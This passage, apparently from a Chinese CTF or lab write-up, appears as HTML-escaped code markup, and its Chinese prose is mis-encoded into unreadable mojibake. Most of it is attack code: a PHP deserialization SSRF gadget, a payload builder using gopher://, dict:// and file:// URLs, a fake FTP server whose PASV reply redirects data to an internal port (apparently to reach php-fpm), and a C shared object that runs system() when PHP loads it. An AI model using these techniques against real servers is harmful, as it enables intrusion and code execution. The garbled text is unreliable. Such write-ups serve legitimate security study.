&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">substr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">7&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">===&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://&amp;#34;&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://127.0.0.1/&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">curl&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$ch&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_init&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">curl_setopt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">CURLOPT_URL&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">curl_setopt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">CURLOPT_HEADER&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">curl_setopt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">CURLOPT_RETURNTRANSFER&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$result&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">curl_exec&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">curl_close&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$result&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__destruct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">curl&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_COOKIE&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;login&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_COOKIE&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;crawldata&amp;#34;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;url&amp;#34;&lt;/span>&lt;span style="color:#111">])){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$crl&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Crawl&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;url&amp;#34;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;no&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç”¨pç‰›è„šæœ¬ç”Ÿæˆpayloadï¼Œç›´æ¥ssrfä¼ªåè®®å¥½åƒä¹Ÿè¡Œï¼Ÿæ²¡ç¯å¢ƒï¼Œäº‘ä¸€ä¸‹äº†&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Crawl&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;gopher://127.0.0.1:9001/_xxxxxxxx&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// $a -&amp;gt; url = &amp;#34;dict://127.0.0.1:80/info&amp;#34;;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// $a -&amp;gt; url = &amp;#34;file:///proc/net/arp&amp;#34;;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å°†åºåˆ—åŒ–ä¹‹åçš„ç»“æœä¼ å…¥crawldata&lt;/p>
&lt;h3 id="ç»“åˆftppasv-modeæ”»å‡»æœ¬åœ°php-fpm">ç»“åˆftp&amp;amp;PASV modeæ”»å‡»æœ¬åœ°php-fpm&lt;/h3>
&lt;h4 id="ftpä½¿ç”¨pasvæ¨¡å¼è½¬å‘ftp-data">ftpä½¿ç”¨PASVæ¨¡å¼è½¬å‘ftp-data&lt;/h4>
&lt;p>å…ˆç®€å•æµ‹è¯•ftpè¿æ¥è¿›è¡ŒæŠ“åŒ…&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112195819783.png" alt="image-20211112195819783">&lt;/p>
&lt;p>å…¶ä¸­çš„&lt;code>227 Entering Passive Mode (192,168,187,3,230,20)&lt;/code>çš„æ‹¬å·å†…çš„å†…å®¹è¡¨ç¤ºçš„æ˜¯ä¼ è¾“çš„FTP-DATAæ‰“å‘çš„ä½ç½®ï¼Œå‰ä¸€éƒ¨åˆ†æ˜¯ipï¼Œç«¯å£æ˜¯230*256+20=58900&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112200459682.png" alt="image-20211112200459682">&lt;/p>
&lt;p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æ–‡ä»¶å†…å®¹æ˜¯150okä¹‹åæ‰è¢«ä¼ å‡ºå»çš„ï¼Œè€Œä¸”ä¼šè¢«æ”¾åœ¨FTP-DATAä¸­è¢«ä¸Šä¼ å’Œä¸‹è½½&lt;/p>
&lt;p>æˆ‘ä»¬å¯ä»¥æ¨¡æ‹Ÿä¸€ä¸ªftp-serverï¼Œåœ¨å“åº”PASVå‘½ä»¤ï¼ˆå³passive åˆ‡æ¢è¢«åŠ¨æ¨¡å¼ï¼‰æ—¶è¿”å›&lt;code>(127,0,0,1,0,12345)&lt;/code>æ¥è®©FTP-DATAæ‰“å‘å†…ç½‘12345ç«¯å£ï¼›è¿™æ˜¯ä¸€ä¸ªæ¶æ„ftp-server&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 192.168.187.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">socket&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[+] listening ...........&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">AF_INET&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">SOCK_STREAM&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">bind&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#d88200">&amp;#39;0.0.0.0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">9999&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">listen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">addr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">accept&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;220 (vsFTPd 3.0.3)&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;331 Please specify the password.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;230 Login successful.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;215 UNIX Type: L8&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;200 Switching to Binary mode.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;227 Entering Passive Mode (127,0,0,1,0,12345).&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;150 Ok to send data.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># sending payload .....&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;226 Transfer complete.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;221 Goodbye.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[+] completed ~~&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>åœ¨å¦ä¸€å°192.168.187.3ä¸Šè®¿é—®è¿™ä¸ªæ¶æ„æœåŠ¡ï¼ŒæœŸé—´ä¼ è¾“çš„æ–‡ä»¶å°±ä¼šè¢«è½¬å‘åˆ°192.168.187.3è‡ªå·±çš„12345ç«¯å£&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112233757565.png" alt="image-20211112233757565">&lt;/p>
&lt;h4 id="phpåŠ è½½æ¶æ„soæ–‡ä»¶">phpåŠ è½½æ¶æ„.soæ–‡ä»¶&lt;/h4>
&lt;p>ä¿®æ”¹php.ini /etc/php/7.4/cli/php.ini&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ini" data-lang="ini">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">[PHP]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">extension&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">/home/amelia/TEMP/fpm/wuhu.so&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Cæºç &lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define _GNU_SOURCE
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">__attribute__&lt;/span> &lt;span style="color:#111">((&lt;/span>&lt;span style="color:#111">__constructor__&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#111">preload&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">void&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;touch /home/amelia/TEMP/fpm/pwned&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç¼–è¯‘ä¸º.so&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>gcc wuhu.c -o wuhu.so --shared -fPIC
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿è¡Œphpå³è§¦å‘æ¶æ„.so&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112162658685.png" alt="image-20211112162658685">&lt;/p>
&lt;h4 id="ä»¤phpä½¿ç”¨ftp">ä»¤phpä½¿ç”¨ftp://&lt;/h4>
&lt;p>/etc/php/7.4/cli/php.ini&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ini" data-lang="ini">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">allow_url_fopen&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">On&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ftpè¯» æ³¨æ„åé¢çš„è·¯å¾„éƒ½éœ€è¦ç»å¯¹è·¯å¾„&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">file_get_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]));&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>php ftp_read.php &lt;span style="color:#d88200">&amp;#39;ftp://test:test@192.168.187.3/home/test/flag.txt&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112215002622.png" alt="image-20211112215002622">&lt;/p>
&lt;p>ftpå†™&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">file_put_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">$agrv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">]));&lt;/span>
